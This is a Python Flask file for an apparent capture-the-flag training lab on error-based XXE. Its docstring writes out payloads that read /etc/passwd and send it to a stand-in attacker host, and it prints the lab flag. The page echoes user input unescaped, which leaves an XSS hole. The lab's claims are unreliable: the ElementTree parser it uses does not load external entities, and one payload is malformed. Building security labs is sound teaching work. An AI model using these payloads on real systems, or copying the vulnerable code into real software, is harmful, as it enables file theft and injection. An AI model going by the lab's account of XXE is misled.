"""
XXE Lab 17: XXE Error-Based Data Extraction
Difficulty: 4 (Expert)
Points: 150

Description:
XXE extracting data through error messages.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: Error-based XXE data extraction
    
    Attack Vector:
    Use DTD to cause intentional errors with data:
    
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
        %eval;
        %exfiltrate;
    ]>
    <foo/>
    
    Or error-based:
    <!DOCTYPE foo [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % xx "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/?%file;'>]>">
        %xx;
    ]>
    
    Flag: FLAG{xxe_error_based_017}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            # VULNERABLE: Error message may contain data
            error = f"Parse Error: {str(e)}"
    
    return f"""
    <html>
    <body>
        <h1>XXE Error-Based Extraction</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5017, debug=False)
